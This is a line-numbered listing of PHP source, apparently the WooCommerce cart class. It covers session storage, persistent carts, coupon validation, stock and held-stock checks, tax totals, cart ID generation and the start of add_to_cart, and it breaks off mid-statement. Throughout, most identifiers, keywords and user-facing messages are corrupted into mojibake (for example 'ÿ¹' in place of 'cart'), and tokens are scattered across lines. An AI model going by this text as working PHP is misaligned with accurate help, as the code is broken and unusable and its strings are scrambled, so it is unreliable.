178 'd©a' => 
$_´oduù


179 ), 
$v®ues
, 
$key
 );

186 iàĞ
$upd©e_ÿ¹_£ssiÚ
 )

187 
	`WC
()->
£ssiÚ
->
ÿ¹
 = 
$this
->
	`g‘_ÿ¹_fÜ_£ssiÚ
();

189 
$this
->
	`£t_ÿ¹_cook›s
ĞĞ$this->
ÿ¹_cÚ‹Ás
 ) > 0 );

192 
	`do_aùiÚ
Ğ'woocomm”û_ÿ¹_lßded_äom_£ssiÚ', 
$this
 );

195 iàĞĞ! 
$this
->
subtÙ®
 && Ğ$this->
ÿ¹_cÚ‹Ás
 ) > 0 ) || 
$upd©e_ÿ¹_£ssiÚ
 )

196 
$this
->
	`ÿlcuÏ‹_tÙ®s
();

197 
	}
}

202 
public
 
funùiÚ
 
	$£t_£ssiÚ
() {

204 
$ÿ¹_£ssiÚ
 = 
$this
->
	`g‘_ÿ¹_fÜ_£ssiÚ
();

206 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'ÿ¹', 
$ÿ¹_£ssiÚ
 );

207 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'­¶›d_coupÚs', 
$this
->
­¶›d_coupÚs
 );

208 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'coupÚ_discouÁ_amouÁs', 
$this
->
coupÚ_discouÁ_amouÁs
 );

210 
	`fÜ—ch
 ( 
$this
->
ÿ¹_£ssiÚ_d©a
 
as
 
$key
 => 
$deçuÉ
 )

211 
	`WC
()->
£ssiÚ
->
	`£t
Ğ
$key
, 
$this
->$key );

213 iàĞ
	`g‘_cu¼’t_u£r_id
() )

214 
$this
->
	`³rsi¡’t_ÿ¹_upd©e
();

216 
	`do_aùiÚ
( 'woocommerce_cart_updated' );

217 
	}
}

226 
public
 
funùiÚ
 
	$em±y_ÿ¹
Ğ
$ş—r_³rsi¡’t_ÿ¹
 = 
Œue
 ) {

227 
$this
->
ÿ¹_cÚ‹Ás
 = 
	`¬¿y
();

228 
$this
->
	`»£t
();

230 
	`un£t
Ğ
	`WC
()->
£ssiÚ
->
Üd”_awa™šg_·ym’t
, WC()->£ssiÚ->
­¶›d_coupÚs
, WC()->£ssiÚ->
coupÚ_discouÁ_amouÁs
, WC()->£ssiÚ->
ÿ¹
 );

232 iàĞ
$ş—r_³rsi¡’t_ÿ¹
 && 
	`g‘_cu¼’t_u£r_id
() )

233 
$this
->
	`³rsi¡’t_ÿ¹_de¡roy
();

235 
	`do_aùiÚ
( 'woocommerce_cart_emptied' );

236 
	}
}

248 
public
 
funùiÚ
 
	$³rsi¡’t_ÿ¹_upd©e
() {

249 
	`upd©e_u£r_m‘a
Ğ
	`g‘_cu¼’t_u£r_id
(), '_woocomm”û_³rsi¡’t_ÿ¹', 
	`¬¿y
(

250 'ÿ¹' => 
	`WC
()->
£ssiÚ
->
ÿ¹
,

252 
	}
}

260 
public
 
funùiÚ
 
	$³rsi¡’t_ÿ¹_de¡roy
() {

261 
	`d–‘e_u£r_m‘a
Ğ
	`g‘_cu¼’t_u£r_id
(), '_woocommerce_persistent_cart' );

262 
	}
}

274 
public
 
funùiÚ
 
	$coupÚs_’abËd
() {

275  
	`­¶y_f‹rs
Ğ'woocomm”û_coupÚs_’abËd', 
	`g‘_İtiÚ
( 'woocommerce_enable_coupons' ) == 'yes' );

276 
	}
}

284 
public
 
funùiÚ
 
	$g‘_ÿ¹_cÚ‹Ás_couÁ
() {

285  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_cÚ‹Ás_couÁ', 
$this
->
ÿ¹_cÚ‹Ás_couÁ
 );

286 
	}
}

294 
public
 
funùiÚ
 
	$check_ÿ¹_™ems
() {

295 
$»suÉ
 = 
$this
->
	`check_ÿ¹_™em_v®id™y
();

297 iàĞ
	`is_wp_”rÜ
Ğ
$»suÉ
 ) )

298 
	`wc_add_nÙiû
Ğ
$»suÉ
->
	`g‘_”rÜ_mes§ge
(), 'error' );

301 
$»suÉ
 = 
$this
->
	`check_ÿ¹_™em_¡ock
();

303 iàĞ
	`is_wp_”rÜ
Ğ
$»suÉ
 ) )

304 
	`wc_add_nÙiû
Ğ
$»suÉ
->
	`g‘_”rÜ_mes§ge
(), 'error' );

305 
	}
}

313 
public
 
funùiÚ
 
	$check_ÿ¹_coupÚs
() {

314 
	`fÜ—ch
 ( 
$this
->
­¶›d_coupÚs
 
as
 
$code
 ) {

315 
$coupÚ
 = 
Ãw
 
	`WC_CoupÚ
Ğ
$code
 );

317 iàĞ! 
$coupÚ
->
	`is_v®id
() ) {

319 
$coupÚ
->
	`add_coupÚ_mes§ge
Ğ
WC_CoupÚ
::
E_WC_COUPON_INVALID_REMOVED
 );

322 
$this
->
	`»move_coupÚ
Ğ
$code
 );

325 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'»äesh_tÙ®s', 
Œue
 );

328 
	}
}

336 
public
 
funùiÚ
 
	$g‘_ÿ¹_™em_quªt™›s
() {

337 
$quªt™›s
 = 
	`¬¿y
();

339 
	`fÜ—ch
 ( 
$this
->
	`g‘_ÿ¹
(è
as
 
$ÿ¹_™em_key
 => 
$v®ues
 ) {

340 iàĞ
$v®ues
['v¬ŸtiÚ_id'] > 0 && $v®ues['d©a']->
v¬ŸtiÚ_has_¡ock
 ) {

342 
$quªt™›s
[ 
$v®ues
['v¬ŸtiÚ_id'] ] = 
	`is£t
( $quantities[ $values['variation_id'] ] ) ? $quantities[ $values['variation_id'] ] + $values['quantity'] : $values['quantity'];

344 
$quªt™›s
[ 
$v®ues
['´oduù_id'] ] = 
	`is£t
( $quantities[ $values['product_id'] ] ) ? $quantities[ $values['product_id'] ] + $values['quantity'] : $values['quantity'];

348  
$quªt™›s
;

349 
	}
}

355 
public
 
funùiÚ
 
	$check_ÿ¹_™em_v®id™y
() {

356 
	`fÜ—ch
 ( 
$this
->
	`g‘_ÿ¹
(è
as
 
$ÿ¹_™em_key
 => 
$v®ues
 ) {

358 
$_´oduù
 = 
$v®ues
['data'];

360 iàĞ! 
$_´oduù
 || ! $_´oduù->
	`exi¡s
(è|| $_´oduù->
po¡
->
po¡_¡©us
 == 'trash' ) {

361 
$this
->
	`£t_quªt™y
Ğ
$ÿ¹_™em_key
, 0 );

363  
Ãw
 
	`WP_E¼Ü
Ğ'šv®id', 
	`__
( 'An item which is‚o†onger‡vailable was„emoved from your cart.', 'woocommerce' ) );

367  
Œue
;

368 
	}
}

376 
public
 
funùiÚ
 
	$check_ÿ¹_™em_¡ock
() {

377 
glob®
 
$wpdb
;

379 
$”rÜ
 = 
Ãw
 
	`WP_E¼Ü
();

381 
$´oduù_qty_š_ÿ¹
 = 
$this
->
	`g‘_ÿ¹_™em_quªt™›s
();

384 
	`fÜ—ch
 ( 
$this
->
	`g‘_ÿ¹
(è
as
 
$ÿ¹_™em_key
 => 
$v®ues
 ) {

386 
$_´oduù
 = 
$v®ues
['data'];

391 iàĞ
$_´oduù
->
	`mªagšg_¡ock
() ) {

396 iàĞ! 
$_´oduù
->
	`is_š_¡ock
(è|| ! $_´oduù->
	`has_’ough_¡ock
Ğ
$v®ues
['quantity'] ) ) {

397 
$”rÜ
->
	`add
Ğ'out-of-¡ock', 
	`¥rštf
(
	`__
Ğ'SÜry, wdØnÙ hav’ough "%s" iÀ¡ockØfulfÈyou¸Üd” (% š stock). PËa£ƒd™ you¸ÿ¹‡ndry‡gaš. W­Şogi£ fÜ‡ny incÚv’›nû cau£d.', 'woocomm”û' ), 
$_´oduù
->
	`g‘_t™Ë
(), $_´oduù->
¡ock
 ) );

398  
$”rÜ
;

402 
$key
 = '_product_id';

403 
$v®ue
 = 
$v®ues
['product_id'];

404 
$š_ÿ¹
 = 
$v®ues
['quantity'];

409 iàĞ
$v®ues
['v¬ŸtiÚ_id'] && 
$_´oduù
->
v¬ŸtiÚ_has_¡ock
 && 
	`is£t
Ğ
$´oduù_qty_š_ÿ¹
[ $values['variation_id'] ] ) ) {

411 
$key
 = '_variation_id';

412 
$v®ue
 = 
$v®ues
['variation_id'];

413 
$š_ÿ¹
 = 
$´oduù_qty_š_ÿ¹
[ 
$v®ues
['variation_id'] ];

415 iàĞ! 
$_´oduù
->
	`has_’ough_¡ock
Ğ
$´oduù_qty_š_ÿ¹
[ 
$v®ues
['variation_id'] ] ) ) {

416 
$”rÜ
->
	`add
Ğ'out-of-¡ock', 
	`¥rštf
(
	`__
Ğ'SÜry, wdØnÙ hav’ough "%s" iÀ¡ockØfulfÈyou¸Üd” (% š stock). PËa£ƒd™ you¸ÿ¹‡ndry‡gaš. W­Şogi£ fÜ‡ny incÚv’›nû cau£d.', 'woocomm”û' ), 
$_´oduù
->
	`g‘_t™Ë
(), $_´oduù->
¡ock
 ) );

417  
$”rÜ
;

420 } 
	`–£if
 ( 
	`is£t
Ğ
$´oduù_qty_š_ÿ¹
[ 
$v®ues
['product_id'] ] ) ) {

422 
$š_ÿ¹
 = 
$´oduù_qty_š_ÿ¹
[ 
$v®ues
['product_id'] ];

424 iàĞ! 
$_´oduù
->
	`has_’ough_¡ock
Ğ
$´oduù_qty_š_ÿ¹
[ 
$v®ues
['product_id'] ] ) ) {

425 
$”rÜ
->
	`add
Ğ'out-of-¡ock', 
	`¥rštf
(
	`__
Ğ'SÜry, wdØnÙ hav’ough "%s" iÀ¡ockØfulfÈyou¸Üd” (% š stock). PËa£ƒd™ you¸ÿ¹‡ndry‡gaš. W­Şogi£ fÜ‡ny incÚv’›nû cau£d.', 'woocomm”û' ), 
$_´oduù
->
	`g‘_t™Ë
(), $_´oduù->
¡ock
 ) );

426  
$”rÜ
;

434 iàĞ
	`g‘_İtiÚ
Ğ'woocomm”û_hŞd_¡ock_mšu‹s' ) > 0 && ! 
$_´oduù
->
	`backÜd”s_®lowed
() ) {

436 
$Üd”_id
 = 
	`is£t
Ğ
	`WC
()->
£ssiÚ
->
Üd”_awa™šg_·ym’t
 ) ? 
	`absšt
( WC()->session->order_awaiting_payment ) : 0;

438 
$h–d_¡ock
 = 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
( "

439 
SELECT
 
	`SUM
Ğ
Üd”_™em_m‘a
.
m‘a_v®ue
 ) 
AS
 
h–d_qty


441 
FROM
 {
$wpdb
->
po¡s
} 
AS
…osts

443 
LEFT
 
JOIN
 {
$wpdb
->
´efix
}
woocomm”û_Üd”_™ems
 
as
 
Üd”_™ems
 
ON
 
po¡s
.
ID
 = ord”_™ems.
Üd”_id


444 
LEFT
 
JOIN
 {
$wpdb
->
´efix
}
woocomm”û_Üd”_™emm‘a
 
as
 
Üd”_™em_m‘a
 
ON
 
Üd”_™ems
.
Üd”_™em_id
 = order_item_meta.order_item_id

445 
LEFT
 
JOIN
 {
$wpdb
->
´efix
}
woocomm”û_Üd”_™emm‘a
 
as
 
Üd”_™em_m‘a2
 
ON
 
Üd”_™ems
.
Üd”_™em_id
 = order_item_meta2.order_item_id

446 
LEFT
 
JOIN
 {
$wpdb
->
‹rm_»ÏtiÚshs
} 
AS
 
»l
 
ON
 
po¡s
.
ID
ô–.
objeù_ID


447 
LEFT
 
JOIN
 {
$wpdb
->
‹rm_xÚomy
} 
AS
 
x
 
	`USING
Ğ
‹rm_xÚomy_id
 )

448 
LEFT
 
JOIN
 {
$wpdb
->
‹rms
} 
AS
 
‹rm
 
	`USING
Ğ
‹rm_id
 )

450 
WHERE
 
Üd”_™em_m‘a
.
m‘a_key
 = '_qty'

451 
AND
 
Üd”_™em_m‘a2
.
m‘a_key
 = %
s
 AND ord”_™em_m‘a2.
m‘a_v®ue
 = %
d


452 
AND
 
po¡s
.
po¡_ty³
 = 'shop_order'

453 
AND
 
po¡s
.
po¡_¡©us
 = 'publish'

454 
AND
 
x
.
xÚomy
 = 'shop_order_status'

455 
AND
 
‹rm
.
¦ug
 
	`IN
 ('pending')

456 
AND
 
po¡s
.
ID
 !ğ%
d


459 iàĞ
$_´oduù
->
¡ock
 < ( 
$h–d_¡ock
 + 
$š_ÿ¹
 ) ) {

460 
$”rÜ
->
	`add
Ğ'out-of-¡ock', 
	`¥rštf
(
	`__
Ğ'SÜry, wdØnÙ hav’ough "%s" iÀ¡ockØfulfÈyou¸Üd”„ighˆnow. PËa£ry‡gaš iÀ%d mšu‹ Üƒd™ you¸ÿ¹‡ndry‡gaš. W­Şogi£ fÜ‡ny incÚv’›nû cau£d.', 'woocomm”û' ), 
$_´oduù
->
	`g‘_t™Ë
(), 
	`g‘_İtiÚ
( 'woocommerce_hold_stock_minutes' ) ) );

461  
$”rÜ
;

469 iàĞ! 
$_´oduù
->
	`is_š_¡ock
() ) {

470 
$”rÜ
->
	`add
Ğ'out-of-¡ock', 
	`¥rštf
(
	`__
Ğ'SÜry, "%s" i nÙ iÀ¡ock. PËa£ƒd™ you¸ÿ¹‡ndry‡gaš. W­Şogi£ fÜ‡ny incÚv’›nû cau£d.', 'woocomm”û' ), 
$_´oduù
->
	`g‘_t™Ë
() ) );

471  
$”rÜ
;

476  
Œue
;

477 
	}
}

487 
public
 
funùiÚ
 
	$g‘_™em_d©a
Ğ
$ÿ¹_™em
, 
$æ©
 = 
çl£
 ) {

488 
$™em_d©a
 = 
	`¬¿y
();

491 iàĞ! 
	`em±y
Ğ
$ÿ¹_™em
['d©a']->
v¬ŸtiÚ_id
 ) && 
	`is_¬¿y
( $cart_item['variation'] ) ) {

493 
$v¬ŸtiÚ_li¡
 = 
	`¬¿y
();

495 
	`fÜ—ch
 ( 
$ÿ¹_™em
['v¬ŸtiÚ'] 
as
 
$Çme
 => 
$v®ue
 ) {

497 iàĞ'' ==ğ
$v®ue
 )

500 
$xÚomy
 = 
	`wc_©Œibu‹_xÚomy_Çme
Ğ
	`¡r_»¶aû
Ğ'©Œibu‹_·_', '', 
	`u¾decode
Ğ
$Çme
 ) ) );

503 iàĞ
	`xÚomy_exi¡s
Ğ
$xÚomy
 ) ) {

504 
$‹rm
 = 
	`g‘_‹rm_by
Ğ'¦ug', 
$v®ue
, 
$xÚomy
 );

505 iàĞ! 
	`is_wp_”rÜ
Ğ
$‹rm
 ) && $‹rm && $‹rm->
Çme
 ) {

506 
$v®ue
 = 
$‹rm
->
Çme
;

508 
$Ïb–
 = 
	`wc_©Œibu‹_Ïb–
Ğ
$xÚomy
 );

512 
$v®ue
 = 
	`­¶y_f‹rs
( 'woocommerce_variation_option_name', $value );

513 
$´oduù_©Œibu‹s
 = 
$ÿ¹_™em
['d©a']->
	`g‘_©Œibu‹s
();

514 iàĞ
	`is£t
Ğ
$´oduù_©Œibu‹s
[ 
	`¡r_»¶aû
Ğ'©Œibu‹_', '', 
$Çme
 ) ] ) ) {

515 
$Ïb–
 = 
	`wc_©Œibu‹_Ïb–
Ğ
$´oduù_©Œibu‹s
[ 
	`¡r_»¶aû
Ğ'©Œibu‹_', '', 
$Çme
 ) ]['name'] );

517 
$Ïb–
 = 
$Çme
;

521 
$™em_d©a
[] = 
	`¬¿y
(

522 'key' => 
$Ïb–
,

523 'v®ue' => 
$v®ue


529 
$Ùh”_d©a
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_™em_d©a', 
	`¬¿y
(), 
$ÿ¹_™em
 );

531 iàĞ
$Ùh”_d©a
 && 
	`is_¬¿y
( $other_data ) && ( $other_data ) > 0 ) {

533 
	`fÜ—ch
 ( 
$Ùh”_d©a
 
as
 
$d©a
 ) {

535 iàĞ
	`em±y
Ğ
$d©a
['hidden'] ) ) {

536 
$di¥Ïy_v®ue
 = ! 
	`em±y
Ğ
$d©a
['display'] ) ? $data['display'] : $data['value'];

538 
$™em_d©a
[] = 
	`¬¿y
(

539 'key' => 
$d©a
['name'],

540 'v®ue' => 
$di¥Ïy_v®ue


547 iàĞĞ
$™em_d©a
 ) > 0 ) {

549 
	`ob_¡¬t
();

551 iàĞ
$æ©
 ) {

552 
	`fÜ—ch
 ( 
$™em_d©a
 
as
 
$d©a
 )

553 
echo
 
	`esc_html
Ğ
$d©a
['key'] ) . ': ' . 
	`wp_k£s_po¡
( $data['value'] ) . "\n";

556 
	`wc_g‘_‹m¶©e
Ğ'ÿ¹/ÿ¹-™em-d©a.php', 
	`¬¿y
Ğ'™em_d©a' => 
$™em_d©a
 ) );

559  
	`ob_g‘_ş—n
();

563 
	}
}

570 
public
 
funùiÚ
 
	$g‘_üoss_£Îs
() {

571 
$üoss_£Îs
 = 
	`¬¿y
();

572 
$š_ÿ¹
 = 
	`¬¿y
();

573 iàĞĞ
$this
->
	`g‘_ÿ¹
() ) > 0 ) {

574 
	`fÜ—ch
 ( 
$this
->
	`g‘_ÿ¹
(è
as
 
$ÿ¹_™em_key
 => 
$v®ues
 ) {

575 iàĞ
$v®ues
['quantity'] > 0 ) {

576 
$üoss_£Îs
 = 
	`¬¿y_m”ge
Ğ
$v®ues
['d©a']->
	`g‘_üoss_£Îs
(), $cross_sells );

577 
$š_ÿ¹
[] = 
$v®ues
['product_id'];

581 
$üoss_£Îs
 = 
	`¬¿y_diff
Ğ$üoss_£Îs, 
$š_ÿ¹
 );

582  
$üoss_£Îs
;

583 
	}
}

590 
public
 
funùiÚ
 
	$g‘_ÿ¹_u¾
() {

591 
$ÿ¹_·ge_id
 = 
	`wc_g‘_·ge_id
( 'cart' );

592  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_ÿ¹_u¾', 
$ÿ¹_·ge_id
 ? 
	`g‘_³rm®šk
( $cart_page_id ) : '' );

593 
	}
}

600 
public
 
funùiÚ
 
	$g‘_checkout_u¾
() {

601 
$checkout_·ge_id
 = 
	`wc_g‘_·ge_id
( 'checkout' );

602 
$checkout_u¾
 = '';

603 iàĞ
$checkout_·ge_id
 ) {

604 iàĞ
	`is_s¦
(è|| 
	`g‘_İtiÚ
('woocommerce_force_ssl_checkout') == 'yes' )

605 
$checkout_u¾
 = 
	`¡r_»¶aû
Ğ'h‰p:', 'h‰ps:', 
	`g‘_³rm®šk
Ğ
$checkout_·ge_id
 ) );

607 
$checkout_u¾
 = 
	`g‘_³rm®šk
Ğ
$checkout_·ge_id
 );

609  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_checkout_u¾', 
$checkout_u¾
 );

610 
	}
}

618 
public
 
funùiÚ
 
	$g‘_»move_u¾
Ğ
$ÿ¹_™em_key
 ) {

619 
$ÿ¹_·ge_id
 = 
	`wc_g‘_·ge_id
('cart');

620  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_»move_u¾', 
$ÿ¹_·ge_id
 ? 
	`wp_nÚû_u¾
Ğ
	`add_qu”y_¬g
Ğ'»move_™em', 
$ÿ¹_™em_key
, 
	`g‘_³rm®šk
( $cart_page_id ) ), 'woocommerce-cart' ) : '' );

621 
	}
}

628 
public
 
funùiÚ
 
	$g‘_ÿ¹
() {

629  
	`¬¿y_f‹r
Ğ(
¬¿y
è
$this
->
ÿ¹_cÚ‹Ás
 );

630 
	}
}

637 
´iv©e
 
funùiÚ
 
	$g‘_ÿ¹_fÜ_£ssiÚ
() {

639 
$ÿ¹_£ssiÚ
 = 
	`¬¿y
();

641 iàĞ
$this
->
	`g‘_ÿ¹
() ) {

642 
	`fÜ—ch
 ( 
$this
->
	`g‘_ÿ¹
(è
as
 
$key
 => 
$v®ues
 ) {

643 
$ÿ¹_£ssiÚ
[ 
$key
 ] = 
$v®ues
;

644 
	`un£t
Ğ
$ÿ¹_£ssiÚ
[ 
$key
 ]['data'] );

648  
$ÿ¹_£ssiÚ
;

649 
	}
}

656 
public
 
funùiÚ
 
	$g‘_xes
() {

657 
$xes
 = 
	`¬¿y
();

660 
	`fÜ—ch
 ( 
	`¬¿y_keys
Ğ
$this
->
xes
 + $this->
shpšg_xes
 ) 
as
 
$key
 ) {

661 
$xes
[ 
$key
 ] = ( 
	`is£t
Ğ
$this
->
shpšg_xes
[ $key ] ) ? $this->shpšg_xes[ $key ] : 0 ) + ( is£tĞ$this->
xes
[ $key ] ) ? $this->taxes[ $key ] : 0 );

664  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_g‘_xes', 
$xes
, 
$this
 );

665 
	}
}

673 
public
 
funùiÚ
 
	$g‘_x_tÙ®s
() {

674 
$xes
 = 
$this
->
	`g‘_xes
();

675 
$x_tÙ®s
 = 
	`¬¿y
();

677 
	`fÜ—ch
 ( 
$xes
 
as
 
$key
 => 
$x
 ) {

679 
$code
 = 
$this
->
x
->
	`g‘_¿‹_code
Ğ
$key
 );

681 iàĞ
$code
 ) {

682 iàĞ! 
	`is£t
Ğ
$x_tÙ®s
[ 
$code
 ] ) ) {

683 
$x_tÙ®s
[ 
$code
 ] = 
Ãw
 
	`¡dCÏss
();

684 
$x_tÙ®s
[ 
$code
 ]->
amouÁ
 = 0;

687 
$x_tÙ®s
[ 
$code
 ]->
x_¿‹_id
 = 
$key
;

688 
$x_tÙ®s
[ 
$code
 ]->
is_compound
 = 
$this
->
x
->
	`is_compound
Ğ
$key
 );

689 
$x_tÙ®s
[ 
$code
 ]->
Ïb–
 = 
$this
->
x
->
	`g‘_¿‹_Ïb–
Ğ
$key
 );

690 
$x_tÙ®s
[ 
$code
 ]->
amouÁ
 +ğ
	`wc_round_x_tÙ®
Ğ
$x
 );

691 
$x_tÙ®s
[ 
$code
 ]->
fÜm©‹d_amouÁ
 = 
	`wc_´iû
Ğ
	`wc_round_x_tÙ®
Ğ$x_tÙ®s[ $cod]->
amouÁ
 ) );

695  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_x_tÙ®s', 
$x_tÙ®s
, 
$this
 );

696 
	}
}

710 
public
 
funùiÚ
 
	$fšd_´oduù_š_ÿ¹
Ğ
$ÿ¹_id
 = 
çl£
 ) {

711 iàĞ
$ÿ¹_id
 !=ğ
çl£
 )

712 iàĞ
	`is_¬¿y
Ğ
$this
->
ÿ¹_cÚ‹Ás
 ) )

713 
	`fÜ—ch
 ( 
$this
->
ÿ¹_cÚ‹Ás
 
as
 
$ÿ¹_™em_key
 => 
$ÿ¹_™em
 )

714 iàĞ
$ÿ¹_™em_key
 =ğ
$ÿ¹_id
 )

715  
$ÿ¹_™em_key
;

718 
	}
}

729 
public
 
funùiÚ
 
g’”©e_ÿ¹_id
Ğ
$´oduù_id
, 
$v¬ŸtiÚ_id
 = 0, 
$v¬ŸtiÚ
 = 
¬¿y
(), 
$ÿ¹_™em_d©a
 = 
	$¬¿y
() ) {

730 
$id_·¹s
 = 
	`¬¿y
Ğ
$´oduù_id
 );

732 iàĞ
$v¬ŸtiÚ_id
 && 0 != $variation_id )

733 
$id_·¹s
[] = 
$v¬ŸtiÚ_id
;

735 iàĞ
	`is_¬¿y
Ğ
$v¬ŸtiÚ
 ) && ! 
	`em±y
( $variation ) ) {

736 
$v¬ŸtiÚ_key
 = '';

737 
	`fÜ—ch
 ( 
$v¬ŸtiÚ
 
as
 
$key
 => 
$v®ue
 ) {

738 
$v¬ŸtiÚ_key
 .ğ
	`Œim
Ğ
$key
 ) .rimĞ
$v®ue
 );

740 
$id_·¹s
[] = 
$v¬ŸtiÚ_key
;

743 iàĞ
	`is_¬¿y
Ğ
$ÿ¹_™em_d©a
 ) && ! 
	`em±y
( $cart_item_data ) ) {

744 
$ÿ¹_™em_d©a_key
 = '';

745 
	`fÜ—ch
 ( 
$ÿ¹_™em_d©a
 
as
 
$key
 => 
$v®ue
 ) {

746 iàĞ
	`is_¬¿y
Ğ
$v®ue
 ) ) $v®uğ
	`h‰p_bud_qu”y
( $value );

747 
$ÿ¹_™em_d©a_key
 .ğ
	`Œim
(
$key
è.rim(
$v®ue
);

749 
$id_·¹s
[] = 
$ÿ¹_™em_d©a_key
;

752  
	`md5
Ğ
	`im¶ode
Ğ'_', 
$id_·¹s
 ) );

753 
	}
}

765 
public
 
funùiÚ
 
add_to_ÿ¹
Ğ
$´oduù_id
, 
$quªt™y
 = 1, 
$v¬ŸtiÚ_id
 = '', 
$v¬ŸtiÚ
 = '', 
$ÿ¹_™em_d©a
 = 
	$¬¿y
() ) {

767 iàĞ
$quªt™y
 <= 0 ) {

768  
çl£
;

772 
$ÿ¹_™em_d©a
 = (
¬¿y
è
	`­¶y_f‹rs
Ğ'woocomm”û_add_ÿ¹_™em_d©a', $ÿ¹_™em_d©a, 
$´oduù_id
, 
$v¬ŸtiÚ_id
 );

775 
$ÿ¹_id
 = 
$this
->
	`g’”©e_ÿ¹_id
Ğ
$´oduù_id
, 
$v¬ŸtiÚ_id
, 
$v¬ŸtiÚ
, 
$ÿ¹_™em_d©a
 );

778 
$ÿ¹_™em_key
 = 
$this
->
	`fšd_´oduù_š_ÿ¹
Ğ
$ÿ¹_id
 );

781 iàĞ'´oduù_v¬ŸtiÚ' =ğ
	`g‘_po¡_ty³
Ğ
$´oduù_id
 ) ) {

782 
$v¬ŸtiÚ_id
 = 
$´oduù_id
;

783 
$´oduù_id
 = 
	`wp_g‘_po¡_·»Á_id
Ğ
$v¬ŸtiÚ_id
 );

787 
$´oduù_d©a
 = 
	`g‘_´oduù
Ğ
$v¬ŸtiÚ_id
 ? $v¬ŸtiÚ_id : 
$´oduù_id
 );

789 iàĞ! 
$´oduù_d©a
 )

790  
çl£
;

793 iàĞ
$´oduù_d©a
->
	`is_sŞd_šdividu®ly
() )

794 
$quªt™y
 = 1;

797 iàĞ! 
$´oduù_d©a
->
	`is_purcha§bË
() ) {

798 
	`wc_add_nÙiû
Ğ
	`__
( 'Sorry,his…roduct cannot be…urchased.', 'woocommerce' ), 'error' );

799  
çl£
;

803 iàĞ! 
$´oduù_d©a
->
	`is_š_¡ock
() ) {

805 
	`wc_add_nÙiû
Ğ
	`¥rštf
Ğ
	`__
Ğ'You cªnÙ‡dd &quÙ;%s&quÙ;Øthÿ¹ beÿu£h´oduù i ouˆoà¡ock.', 'woocomm”û' ), 
$´oduù_d©a
->
	`g‘_t™Ë
() ), 'error' );

807  
çl£
;

808 } 
	`–£if
 ( ! 
$´oduù_d©a
->
	`has_’ough_¡ock
Ğ
$quªt™y
 ) ) {

810 
	`wc_add_nÙiû
Ğ
	`¥rštf
(
	`__
Ğ'You cªnÙ‡ddh©‡mouÁ oà&quÙ;%s&quÙ;Øthÿ¹ beÿu£h”i nÙƒnough stock (% »maššg).', 'woocomm”û' ), 
$´oduù_d©a
->
	`g‘_t™Ë
(), $´oduù_d©a->
	`g‘_¡ock_quªt™y
() ), 'error' );

812  
çl£
;

816 iàĞ
$´oduù_d©a
->
	`is_sŞd_šdividu®ly
() ) {

817 
$š_ÿ¹_quªt™y
 = 
$ÿ¹_™em_key
 ? 
$this
->
ÿ¹_cÚ‹Ás
[$cart_item_key]['quantity'] : 0;

820 iàĞ
$š_ÿ¹_quªt™y
 > 0 ) {

821 
	`wc_add_nÙiû
Ğ
	`¥rštf
(

823 
$this
->
	`g‘_ÿ¹_u¾
(),

824 
	`__
( 'View Cart', 'woocommerce' ),

825 
	`¥rštf
Ğ
	`__
Ğ'You cªnÙ‡dd‡nÙh” &quÙ;%s&quÙ;Øyou¸ÿ¹.', 'woocomm”û' ), 
$´oduù_d©a
->
	`g‘_t™Ë
() )

827  
çl£
;

832 
$´oduù_qty_š_ÿ¹
 = 
$this
->
	`g‘_ÿ¹_™em_quªt™›s
();

834 iàĞ
$´oduù_d©a
->
	`mªagšg_¡ock
() ) {

837 iàĞ
$v¬ŸtiÚ_id
 && 
$´oduù_d©a
->
v¬ŸtiÚ_has_¡ock
 ) {

839 iàĞ
	`is£t
Ğ
$´oduù_qty_š_ÿ¹
[ 
$v¬ŸtiÚ_id
 ] ) && ! 
$´oduù_d©a
->
	`has_’ough_¡ock
Ğ$´oduù_qty_š_ÿ¹[ $v¬ŸtiÚ_id ] + 
$quªt™y
 ) ) {

840 
	`wc_add_nÙiû
Ğ
	`¥rštf
(

842 
$this
->
	`g‘_ÿ¹_u¾
(),

843 
	`__
( 'View Cart', 'woocommerce' ),

844 
	`¥rštf
Ğ
	`__
Ğ'You cªnÙ‡ddh©‡mouÁØthÿ¹ &mdash; whav% š stock‡nd you‡Ì—dy hav% š you¸ÿ¹.', 'woocomm”û' ), 
$´oduù_d©a
->
	`g‘_¡ock_quªt™y
(), 
$´oduù_qty_š_ÿ¹
[ 
$v¬ŸtiÚ_id
 ] )

846  
çl£
;

852 iàĞ
	`is£t
Ğ
$´oduù_qty_š_ÿ¹
[ 
$´oduù_id
 ] ) && ! 
$´oduù_d©a
->
	`has_’ough_¡ock
Ğ$´oduù_qty_š_ÿ¹[ $´oduù_id ] + 
$quªt™y
 ) ) {

853 
	`wc_add_nÙiû
Ğ
	`¥rštf
(

855 
$this
->
	`g‘_ÿ¹_u¾
(),

856 
	`__
( 'View Cart', 'woocommerce' ),

857 
	`¥rštf
Ğ
	`__
Ğ'You cªnÙ‡ddh©‡mouÁØthÿ¹ &mdash; whav% š stock‡nd you‡Ì—dy hav% š you¸ÿ¹.', 'woocomm”û' ), 
$´oduù_d©a
->
	`g‘_¡ock_quªt™y
(), 
$´oduù_qty_š_ÿ¹
[ 
$´oduù_id
 ] )

859  
çl£
;

867 iàĞ
$ÿ¹_™em_key
 ) {

869 
$Ãw_quªt™y
 = 
$quªt™y
 + 
$this
->
ÿ¹_cÚ‹Ás
[
$ÿ¹_™em_key
]['quantity'];

871 
$this
->
	`£t_quªt™y
Ğ
$ÿ¹_™em_key
, 
$Ãw_quªt™y
, 
çl£
 );

875 
$ÿ¹_™em_key
 = 
$ÿ¹_id
;

878 
$this
->
ÿ¹_cÚ‹Ás
[
$ÿ¹_™em_key
] = 
	`­¶y_f‹rs
Ğ'woocomm”û_add_ÿ¹_™em', 
	`¬¿y_m”ge
Ğ
$ÿ¹_™em_d©a
, 
	`¬¿y
(

879 '´oduù_id' => 
$´oduù_id
,

880 'v¬ŸtiÚ_id' => 
$v¬ŸtiÚ_id
,

